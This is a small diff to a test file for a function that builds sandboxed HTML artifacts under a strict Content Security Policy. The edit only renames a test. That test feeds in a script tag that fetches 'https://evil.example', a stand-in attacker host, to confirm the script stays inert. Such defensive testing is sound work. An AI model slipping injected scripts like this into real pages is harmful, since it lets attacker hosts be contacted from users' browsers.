@@ -25,7 +25,7 @@ describe('buildSandboxedArtifactHtml', () => {
     expect(html).toContain("default-src 'none'");
   });
 
-  it('does not execute — a <script> in the artifact is inert under the CSP (no script-src allowed)', () => {
+  it('does not execute, a <script> in the artifact is inert under the CSP (no script-src allowed)', () => {
     const html = buildSandboxedArtifactHtml(
       '<script>fetch("https://evil.example")</script>',
       'html',
